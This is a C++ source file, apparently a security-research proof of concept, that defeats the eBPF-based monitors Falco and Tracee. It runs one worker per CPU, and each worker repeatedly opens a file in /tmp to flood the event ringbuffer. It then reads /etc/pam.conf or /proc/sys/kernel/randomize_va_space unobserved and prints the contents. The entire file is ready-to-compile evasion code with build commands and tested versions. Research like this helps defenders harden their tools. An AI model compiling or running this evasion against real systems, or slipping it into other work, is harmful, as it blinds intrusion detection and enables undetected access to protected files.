// An example exploit program that bypasses eBPF protections by filling the
// ringbuffer used by eBPF to send events to userspace monitoring processes.
//
// This program was tested with Falco on an Ubuntu 22.04 VM with 2 CPU cores
// and 2GB of RAM with the following verison information:
//
// Sun Apr 30 04:14:51 2023: Falco version: 0.34.1 (x86_64)
// Sun Apr 30 04:14:51 2023: Falco initialized with configuration file: /etc/falco/falco.yaml
// Falco version: 0.34.1
// Libs version:  0.10.4
// Plugin API:    2.0.0
// Engine:        16
// Driver:
//  API version:    3.0.0
//  Schema version: 2.0.0
//  Default driver: 4.0.0+driver
//
// Compile this program with the following command:
//
// g++ exhaust.cpp -lstdc++fs --std=c++17 -O3 -o exhaust;
//
// The tested version of this program was compiled with the following g++
// version. Other g++ versions should be work too but have not been tested.
//
// g++ (Ubuntu 10.3.0-1ubuntu1~20.10) 10.3.0
// Copyright (C) 2020 Free Software Foundation, Inc.
// This is free software; see the source for copying conditions.  There is NO
// warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

#include <algorithm>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <random>
#include <string>

#include <fcntl.h>
#include <limits.h>
#include <sched.h>
#include <signal.h>
#include <unistd.h>

#include <sys/mman.h>
#include <sys/sysinfo.h>

bool TARGET_IS_TRACEE = false;

void sleep_ms(int milliseconds) {
    struct timespec ts;
    ts.tv_sec = milliseconds / 1000;
    ts.tv_nsec = (milliseconds % 1000) * 1000000;
    nanosleep(&ts, nullptr);
}

std::string generateRandomPath(int max_length) {
    std::string path = "/tmp/";
    std::string filename;
    for (int i = 0; i < max_length; ++i) {
        filename.push_back('A' + rand() % 26); // Random uppercase letter
    }
    return path + filename;
}

// The function run by worker processes. It sets its CPU affinity, increments
// a counter, and opens a file that doesn't exist in an infinite loop.
void exhaust(uint64_t *counters, uint64_t counter_index) {
    // Set the CPU affinity. We launch one worker per CPU
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(counter_index, &set);
    sched_setaffinity(getpid(), sizeof(cpu_set_t), &set);
    // Create a random filename in the tmp directory
    uint64_t filename_size = 16;
    if (TARGET_IS_TRACEE) {
        filename_size = NAME_MAX;
    }
    std::string path = generateRandomPath(filename_size);
    int fd = -1;
    if (TARGET_IS_TRACEE) {
        fd = open(path.c_str(), O_RDWR|O_CREAT, S_IRUSR | S_IWUSR);
    } else {
        while (std::filesystem::exists(path)) {
            path = generateRandomPath(filename_size);
        }
    }
    if (TARGET_IS_TRACEE) {
        while (true) {
            close(fd);
            fd = open(path.c_str(), O_RDWR);
            counters[counter_index]++;
        }
    } else {
        while (true) {
            open(path.c_str(), O_RDWR);
            counters[counter_index]++;
        }
    }
}

bool parseArgs(int argc, char* argv[]) {
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-tracee") {
            TARGET_IS_TRACEE = true;
        } else {
            std::cerr << "Unknown argument: " << arg << std::endl;
            return false;
        }
    }
    return true;
}

void printUsageMessage() {
    std::cout << "Usage: ./exhaust [-tracee]" << std::endl;
    std::cout << "    -tracee: Whether the target is tracee. The default configuration targets falco." << std::endl;
}

void initialize(int argc, char *argv[]) {
        if (parseArgs(argc, argv)) {
            if (TARGET_IS_TRACEE) {
                std::cout << "Target is tracee. Running the attack..." << std::endl;
            } else {
                std::cout << "Target is falco. Running the attack..." << std::endl;
            }
        } else {
            printUsageMessage();
            exit(1);
        }
     srand(time(NULL));
}


int main(int argc, char *argv[]) {
    initialize(argc, argv);
    // Get the number of CPUs
    int num_procs = get_nprocs();
    uint64_t counter_value = 1024*256/num_procs;
    if (TARGET_IS_TRACEE) {
        counter_value = 1024*1024;
    }
    // Create one counter for each worker process
    uint64_t *counters = (uint64_t *) mmap(NULL, sizeof(uint64_t) * num_procs, PROT_READ | PROT_WRITE,
                                            MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    // List of pids for worker processes
    std::vector<pid_t> pids = {};
    for (uint64_t i = 0; i < num_procs; i++) {
        // Create a worker process. We create one worker per available CPU.
        pid_t pid = fork();
        if (pid == 0) {
            // Child processes run exhaust
            exhaust(counters, i);
            return 0;
        } else {
            // The parent records the pids of children
            pids.emplace_back(pid);
        }
    }

    while (true) {
        bool ready = true;
        // Check that each worker has done the proper ammount of work
        for (int i = 0; i < num_procs; i++) {
            if (counters[i] < counter_value) {
                ready = false;
            }
        }
        if (ready) {
            std::ifstream infile;
            std::string line;
            // Depending on the target app, we target different files.
            if (TARGET_IS_TRACEE) {
                infile.open("/proc/sys/kernel/randomize_va_space");
                std::cout << "OPENED /proc/sys/kernel/randomize_va_space. HERE IS THE DATA:" << std::endl;
            } else {
                infile.open("/etc/pam.conf");
                std::cout << "OPENED /etc/pam.conf. HERE IS THE DATA:" << std::endl;
            }
            // Prove we opened the file for reading by printing the contents
            while (std::getline(infile, line)) {
                std::cout << line << std::endl;
            }
            // We are done. Kill the workers
            for (auto const pid : pids) {
                kill(pid, SIGKILL);
            }
            // Exit
            exit(0);
        } else {
            sleep_ms(50);
        }
    }
}
